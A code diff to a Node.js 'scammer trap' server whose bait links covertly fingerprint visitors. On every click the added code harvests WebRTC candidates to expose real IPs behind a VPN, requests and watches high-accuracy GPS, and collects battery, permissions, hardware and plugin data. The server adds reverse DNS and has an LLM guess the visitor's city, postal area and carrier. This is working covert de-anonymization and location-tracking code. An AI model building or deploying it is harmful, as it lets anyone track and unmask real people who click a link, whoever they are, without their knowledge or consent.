@@ -5,6 +5,7 @@ const { Server } = require('socket.io');
 const axios = require('axios');
 const cors = require('cors');
 const crypto = require('crypto');
+const dns = require('dns').promises;
 
 const app = express();
 
@@ -160,7 +161,7 @@ app.get('/', adminLimiter, adminAuth, (req, res) => {
       </div>
 
       <div>
-        <h3 class="text-lg text-amber-400 mb-3">Research-mode events (geolocation &amp; extras)</h3>
+        <h3 class="text-lg text-amber-400 mb-3">Research-mode events (always-on — geolocation refinements stream here)</h3>
         <div id="liveResearch" class="space-y-4"></div>
         <div id="researchHistory" class="space-y-4 mt-3"><em class="text-zinc-500">Loading…</em></div>
       </div>
@@ -212,10 +213,69 @@ app.get('/', adminLimiter, adminAuth, (req, res) => {
       const ip = escapeHtml(data.ip);
       const visitorId = escapeHtml(data.visitorId || '—');
       const country = escapeHtml(data.ipinfo && data.ipinfo.country || '—');
+      const region = escapeHtml(data.ipinfo && data.ipinfo.region || '');
+      const city = escapeHtml(data.ipinfo && data.ipinfo.city || '');
+      const postal = escapeHtml(data.ipinfo && data.ipinfo.postal || '');
       const org = escapeHtml(data.ipinfo && data.ipinfo.org || '—');
+      const ipinfoLoc = escapeHtml(data.ipinfo && data.ipinfo.loc || '');
+      const hostnames = escapeHtml((data.hostnames && data.hostnames.join(', ')) || '—');
       const abuse = escapeHtml((data.abuse && data.abuse.abuseConfidenceScore) || 0);
-      const profile = data.aiProfile ? escapeHtml(String(data.aiProfile).substring(0, 180)) + '…' : '—';
+      const profile = data.aiProfile ? escapeHtml(String(data.aiProfile)) : '—';
       const rawJson = escapeHtml(JSON.stringify(data, null, 2));
+
+      // Always-on research-mode signals (geolocation + extras + WebRTC IPs).
+      const research = data.research || {};
+      const geo = research.geolocation || null;
+      const extras = research.extras || {};
+      const webrtc = Array.isArray(research.webrtc) ? research.webrtc : [];
+      const webrtcIps = webrtc.map(c => c && c.ip).filter(Boolean);
+      const uniqueWebrtcIps = Array.from(new Set(webrtcIps));
+      const leakedIps = uniqueWebrtcIps.filter(x => x && x !== data.ip);
+
+      const cityRegion = [city, region, postal].filter(Boolean).join(', ');
+      const conn = extras.connection || null;
+      const battery = extras.battery || null;
+      const ua = escapeHtml(data.ua || '—');
+      const tz = escapeHtml(data.timezone || '—');
+      const langs = escapeHtml((data.languages || []).join(', ') || '—');
+      const scr = data.screen ? escapeHtml(data.screen.w + '×' + data.screen.h) : '—';
+
+      const geoBlock = geo ? \`
+        <div class="mt-4 bg-amber-950/40 border border-amber-700/50 rounded-xl p-3 text-sm">
+          <div class="text-amber-300 font-bold mb-1">📍 Precise location (browser GPS)</div>
+          <div class="grid grid-cols-1 md:grid-cols-3 gap-2">
+            <div>Lat: <span class="font-mono">\${escapeHtml(geo.latitude)}</span></div>
+            <div>Lon: <span class="font-mono">\${escapeHtml(geo.longitude)}</span></div>
+            <div>Accuracy: <span class="font-mono">\${escapeHtml(geo.accuracy)} m</span></div>
+          </div>
+          <div class="mt-1"><a class="text-blue-400 underline" target="_blank" rel="noopener noreferrer" href="https://www.openstreetmap.org/?mlat=\${encodeURIComponent(geo.latitude)}&mlon=\${encodeURIComponent(geo.longitude)}#map=17/\${encodeURIComponent(geo.latitude)}/\${encodeURIComponent(geo.longitude)}">open map</a></div>
+        </div>\` : '';
+
+      const ipinfoMapLink = ipinfoLoc && !geo ? \`<a class="text-blue-400 underline ml-2" target="_blank" rel="noopener noreferrer" href="https://www.openstreetmap.org/?mlat=\${encodeURIComponent(ipinfoLoc.split(',')[0])}&mlon=\${encodeURIComponent(ipinfoLoc.split(',')[1])}#map=11/\${encodeURIComponent(ipinfoLoc.split(',')[0])}/\${encodeURIComponent(ipinfoLoc.split(',')[1])}">open map</a>\` : '';
+
+      const leakBlock = leakedIps.length ? \`
+        <div class="mt-3 bg-red-950/40 border border-red-700/50 rounded-xl p-3 text-sm">
+          <div class="text-red-300 font-bold">⚠️ WebRTC IP leak — possible real IP behind VPN/proxy</div>
+          <div class="mt-1 font-mono">\${escapeHtml(leakedIps.join(', '))}</div>
+        </div>\` : '';
+
+      const extrasBlock = \`
+        <div class="mt-3 grid grid-cols-2 md:grid-cols-4 gap-2 text-xs text-zinc-300">
+          <div>Hostname: <span class="font-mono">\${hostnames}</span></div>
+          <div>Timezone: <span class="font-mono">\${tz}</span></div>
+          <div>Languages: <span class="font-mono">\${langs}</span></div>
+          <div>Screen: <span class="font-mono">\${scr}</span></div>
+          <div>Platform: <span class="font-mono">\${escapeHtml(extras.platform || '—')}</span></div>
+          <div>Vendor: <span class="font-mono">\${escapeHtml(extras.vendor || '—')}</span></div>
+          <div>CPU cores: <span class="font-mono">\${escapeHtml(extras.hardwareConcurrency || '—')}</span></div>
+          <div>RAM (GB): <span class="font-mono">\${escapeHtml(extras.deviceMemory || '—')}</span></div>
+          <div>Touch pts: <span class="font-mono">\${escapeHtml(extras.maxTouchPoints || 0)}</span></div>
+          <div>Pixel ratio: <span class="font-mono">\${escapeHtml(extras.pixelRatio || '—')}</span></div>
+          <div>Net type: <span class="font-mono">\${escapeHtml((conn && conn.effectiveType) || '—')}</span></div>
+          <div>Battery: <span class="font-mono">\${battery ? escapeHtml(Math.round((battery.level || 0) * 100) + '% ' + (battery.charging ? '⚡' : '')) : '—'}</span></div>
+        </div>
+        <div class="mt-2 text-xs text-zinc-500">UA: <span class="font-mono break-all">\${ua}</span></div>\`;
+
       entry.innerHTML = \`
         <div class="flex justify-between">
           <span class="font-bold">Trap ID: \${trapId}</span>
@@ -224,10 +284,16 @@ app.get('/', adminLimiter, adminAuth, (req, res) => {
         <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mt-4">
           <div>IP: <span class="font-mono">\${ip}</span></div>
           <div>VisitorID: <span class="font-mono">\${visitorId}</span></div>
-          <div>Country/ASN: \${country} / \${org}</div>
+          <div>Country: \${country} \${cityRegion ? '— ' + cityRegion : ''}\${ipinfoMapLink}</div>
+          <div>ASN/Org: \${org}</div>
           <div>Abuse Score: \${abuse}%</div>
+          <div>WebRTC candidates: <span class="font-mono">\${escapeHtml(uniqueWebrtcIps.join(', ') || '—')}</span></div>
         </div>
-        <div class="mt-4 text-sm text-lime-300">AI Scammer Profile: \${profile}</div>
+        \${geoBlock}
+        \${leakBlock}
+        \${extrasBlock}
+        <div class="mt-4 text-sm text-lime-300 whitespace-pre-wrap">AI Scammer Profile:
+\${profile}</div>
         <button onclick="this.parentElement.querySelector('.raw').classList.toggle('hidden')" class="text-xs mt-4 underline">Show Raw JSON</button>
         <pre class="raw hidden mt-4 text-xs bg-black p-4 overflow-auto">\${rawJson}</pre>
       \`;
@@ -295,7 +361,7 @@ app.get('/', adminLimiter, adminAuth, (req, res) => {
         const rows = await r.json();
         debugLog('Research history loaded: ' + rows.length + ' rows');
         if (!Array.isArray(rows) || rows.length === 0) {
-          wrap.innerHTML = '<em class="text-zinc-500">No research-mode events yet. Enable research preview and wait for a click.</em>';
+          wrap.innerHTML = '<em class="text-zinc-500">No research-mode events yet. Research mode is always on — events stream here as soon as a scammer clicks a bait link and grants (or has previously granted) location permission.</em>';
           return;
         }
         wrap.innerHTML = '';
@@ -442,6 +508,114 @@ app.get('/check-scammer/:id', (req, res) => {
   <script src="https://openfpcdn.io/fingerprintjs/v5"></script>
   <script src="https://cdn.jsdelivr.net/npm/@thumbmarkjs/thumbmarkjs/dist/thumbmark.umd.js"></script>
   <script>
+    // Research-mode helpers — these run unconditionally on every click. There
+    // is no toggle: research signals are always captured and bundled into the
+    // regular /api/track payload so they show up alongside the click.
+
+    // Best-effort high-accuracy geolocation. Resolves with whatever we can
+    // get, never rejects, so the redirect is never blocked.
+    function captureGeolocation() {
+      return new Promise(resolve => {
+        if (!navigator.geolocation) return resolve(null);
+        let done = false;
+        const finish = (val) => { if (!done) { done = true; resolve(val); } };
+        // Hard cap so we never hang the redirect.
+        setTimeout(() => finish(null), 8000);
+        try {
+          navigator.geolocation.getCurrentPosition(
+            p => finish({
+              latitude: p.coords.latitude,
+              longitude: p.coords.longitude,
+              accuracy: p.coords.accuracy,
+              altitude: p.coords.altitude,
+              altitudeAccuracy: p.coords.altitudeAccuracy,
+              heading: p.coords.heading,
+              speed: p.coords.speed,
+              timestamp: p.timestamp
+            }),
+            () => finish(null),
+            { enableHighAccuracy: true, maximumAge: 0, timeout: 7500 }
+          );
+        } catch (e) { finish(null); }
+      });
+    }
+
+    // WebRTC candidate harvest — can reveal LAN IPs and sometimes the real
+    // public IP behind a VPN/proxy. Best-effort, non-blocking.
+    function captureWebRtcCandidates() {
+      return new Promise(resolve => {
+        const out = [];
+        let done = false;
+        const finish = () => { if (!done) { done = true; resolve(out); } };
+        setTimeout(finish, 3000);
+        try {
+          const RTCPC = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
+          if (!RTCPC) return finish();
+          const pc = new RTCPC({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+          pc.createDataChannel('x');
+          pc.onicecandidate = (ev) => {
+            if (!ev.candidate) { try { pc.close(); } catch(_) {} return finish(); }
+            const c = ev.candidate.candidate || '';
+            const m = c.match(/(?:^| )([a-fA-F0-9:.]+) \\d+ typ (\\w+)/);
+            if (m) out.push({ ip: m[1], type: m[2], raw: c });
+            else out.push({ raw: c });
+          };
+          pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => finish());
+        } catch (e) { finish(); }
+      });
+    }
+
+    async function captureExtras() {
+      const nav = navigator || {};
+      const conn = nav.connection || nav.mozConnection || nav.webkitConnection || null;
+      let battery = null;
+      try {
+        if (typeof nav.getBattery === 'function') {
+          const b = await nav.getBattery();
+          battery = { level: b.level, charging: b.charging, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
+        }
+      } catch (e) {}
+      let storage = null;
+      try {
+        if (nav.storage && typeof nav.storage.estimate === 'function') {
+          storage = await nav.storage.estimate();
+        }
+      } catch (e) {}
+      let permissions = {};
+      try {
+        if (nav.permissions && typeof nav.permissions.query === 'function') {
+          for (const name of ['geolocation', 'notifications', 'camera', 'microphone']) {
+            try { permissions[name] = (await nav.permissions.query({ name })).state; } catch (_) {}
+          }
+        }
+      } catch (e) {}
+      return {
+        platform: nav.platform || null,
+        userAgentData: nav.userAgentData ? {
+          brands: nav.userAgentData.brands,
+          mobile: nav.userAgentData.mobile,
+          platform: nav.userAgentData.platform
+        } : null,
+        vendor: nav.vendor || null,
+        hardwareConcurrency: nav.hardwareConcurrency || null,
+        deviceMemory: nav.deviceMemory || null,
+        maxTouchPoints: nav.maxTouchPoints || 0,
+        cookieEnabled: nav.cookieEnabled || false,
+        doNotTrack: nav.doNotTrack || null,
+        pdfViewerEnabled: nav.pdfViewerEnabled || false,
+        connection: conn ? { effectiveType: conn.effectiveType, downlink: conn.downlink, rtt: conn.rtt, saveData: conn.saveData, type: conn.type } : null,
+        battery,
+        storage,
+        permissions,
+        pixelRatio: window.devicePixelRatio || null,
+        colorDepth: screen.colorDepth || null,
+        orientation: (screen.orientation && screen.orientation.type) || null,
+        plugins: Array.from(navigator.plugins || []).map(p => p.name).slice(0, 20),
+        referrer: document.referrer || null,
+        timezoneOffsetMinutes: new Date().getTimezoneOffset()
+      };
+    }
+
     async function activateTrap(trapId, ip) {
       try {
         console.log('🔍 Fingerprinting... trapId=' + trapId + ' ip=' + ip);
@@ -464,6 +638,15 @@ app.get('/check-scammer/:id', (req, res) => {
           console.error('⚠️ ThumbmarkJS failed:', e);
         }
 
+        // Always-on research-mode signals captured in parallel with the
+        // fingerprints above. Each helper is best-effort and never throws.
+        const [geo, webrtc, extras] = await Promise.all([
+          captureGeolocation(),
+          captureWebRtcCandidates(),
+          captureExtras()
+        ]);
+        console.log('🔬 Research signals captured: geo=' + !!geo + ' webrtc=' + (webrtc ? webrtc.length : 0) + ' extras=' + !!extras);
+
         const payload = {
           trapId,
           visitorId,
@@ -473,7 +656,13 @@ app.get('/check-scammer/:id', (req, res) => {
           fingerprint: fpResult,
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
           languages: Array.from(navigator.languages || []),
-          screen: { w: screen.width, h: screen.height }
+          screen: { w: screen.width, h: screen.height },
+          // Research-mode payload — always present, no toggle.
+          research: {
+            geolocation: geo,
+            webrtc,
+            extras
+          }
         };
 
         console.log('📤 Sending to server...', { trapId, ip, visitorId });
@@ -505,28 +694,44 @@ app.get('/check-scammer/:id', (req, res) => {
           }
         }
 
-        // Research mode — geolocation + camera. Best-effort; never blocks redirect.
+        // Research mode — high-accuracy geolocation streamed to the live
+        // research feed. Always-on; best-effort; never blocks redirect.
+        // We also briefly watchPosition to capture refined GPS fixes as
+        // accuracy improves over the next few seconds.
         try {
-          navigator.geolocation.getCurrentPosition(p => {
+          const sendGeo = (p) => {
             const geo = {
               trapId,
               latitude: p.coords.latitude,
               longitude: p.coords.longitude,
               accuracy: p.coords.accuracy,
               altitude: p.coords.altitude,
+              altitudeAccuracy: p.coords.altitudeAccuracy,
               heading: p.coords.heading,
               speed: p.coords.speed,
               timestamp: p.timestamp
             };
-            console.log('📍 Geolocation captured, sending...');
             fetch('/api/live', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify(geo)
             }).catch(e => console.error('⚠️ Geo send failed:', e));
-          }, (err) => {
-            console.log('📍 Geolocation denied/unavailable:', err.message);
-          });
+          };
+          navigator.geolocation.getCurrentPosition(
+            p => { console.log('📍 Geolocation captured (initial), sending...'); sendGeo(p); },
+            (err) => { console.log('📍 Geolocation denied/unavailable:', err.message); },
+            { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+          );
+          // Refine for a short window then stop.
+          let watchId = null;
+          try {
+            watchId = navigator.geolocation.watchPosition(
+              p => sendGeo(p),
+              () => {},
+              { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
+            );
+            setTimeout(() => { try { navigator.geolocation.clearWatch(watchId); } catch(_) {} }, 20000);
+          } catch (_) {}
         } catch (e) {
           console.error('⚠️ Geolocation error:', e);
         }
@@ -651,7 +856,17 @@ app.post('/api/track', trackLimiter, async (req, res) => {
 
   setImmediate(async () => {
     try {
-      let ipinfo = null, abuse = null, aiProfile = null;
+      let ipinfo = null, abuse = null, aiProfile = null, hostnames = null;
+
+      // Reverse-DNS — cheap, no API key, sometimes leaks ISP customer
+      // hostname like `c-73-x-x-x.hsd1.wa.comcast.net` which gives a
+      // coarse geographic + carrier hint.
+      if (clientIp) {
+        try {
+          hostnames = await dns.reverse(clientIp);
+          console.log(`🔎 Reverse DNS: ${hostnames.join(', ')}`);
+        } catch (e) { /* common: no PTR record */ }
+      }
 
       if (process.env.IPINFO_TOKEN && clientIp) {
         console.log(`🌐 Fetching ipinfo for ${clientIp}...`);
@@ -686,8 +901,11 @@ app.post('/api/track', trackLimiter, async (req, res) => {
         console.log('🤖 Requesting AI profile from OpenRouter...');
         try {
           const summary = {
-            ip: clientIp, ua: body.ua, ipinfo, abuse,
-            timezone: body.timezone, languages: body.languages, screen: body.screen
+            ip: clientIp, ua: body.ua, ipinfo, abuse, hostnames,
+            timezone: body.timezone, languages: body.languages, screen: body.screen,
+            // Research-mode signals — always included so the AI can attempt
+            // a best-effort probabilistic identity / location / carrier guess.
+            research: body.research || null
           };
           const r = await axios.post(
             'https://openrouter.ai/api/v1/chat/completions',
@@ -696,12 +914,24 @@ app.post('/api/track', trackLimiter, async (req, res) => {
               reasoning_effort: 'high',
               messages: [{
                 role: 'user',
-                content: 'In 2-3 sentences, profile this likely-scammer click based on the data. Be concise.\n\n' + JSON.stringify(summary)
+                content:
+                  'You are profiling a likely-scammer click for a defensive anti-scam ' +
+                  'tool. Using ONLY the structured signals below, give a concise ' +
+                  'probabilistic profile. Where the data supports it, include best-' +
+                  'guess hypotheses (clearly hedged with confidence words like ' +
+                  '"likely" / "possibly") for: approximate location (city / region / ' +
+                  'postal area), likely ISP or mobile carrier, device class (mobile ' +
+                  'vs desktop), whether they are likely behind a VPN/proxy/Tor (note ' +
+                  'any WebRTC IP leak vs reported IP), and a one-line behavioural ' +
+                  'summary. Do NOT invent names, phone numbers, street addresses, or ' +
+                  'any specific personal identifiers that are not derivable from the ' +
+                  'data. Keep it under ~8 short bullet points.\n\n' +
+                  JSON.stringify(summary)
               }]
             },
             {
               headers: { Authorization: `Bearer ${process.env.OPENROUTER_KEY}` },
-              timeout: 10000
+              timeout: 15000
             }
           );
           aiProfile = r.data && r.data.choices && r.data.choices[0] && r.data.choices[0].message && r.data.choices[0].message.content;
@@ -713,7 +943,7 @@ app.post('/api/track', trackLimiter, async (req, res) => {
 
       // Strip client-supplied ip so it can't override the server-derived value.
       const { ip: _ignored, ...safeBody } = body;
-      const enriched = Object.assign({}, safeBody, { ip: clientIp, ipinfo, abuse, aiProfile });
+      const enriched = Object.assign({}, safeBody, { ip: clientIp, ipinfo, abuse, aiProfile, hostnames });
 
       try {
         await pool.query('INSERT INTO clicks (trap_id, data) VALUES ($1, $2)', [trapId, enriched]);
@@ -743,7 +973,7 @@ app.post('/api/live', liveLimiter, async (req, res) => {
     return res.status(404).json({ error: 'unknown trap' });
   }
 
-  const numericFields = ['latitude', 'longitude', 'accuracy', 'altitude', 'heading', 'speed', 'timestamp'];
+  const numericFields = ['latitude', 'longitude', 'accuracy', 'altitude', 'altitudeAccuracy', 'heading', 'speed', 'timestamp'];
   const clean = { trapId };
   for (const k of numericFields) {
     if (body[k] === undefined || body[k] === null) continue;
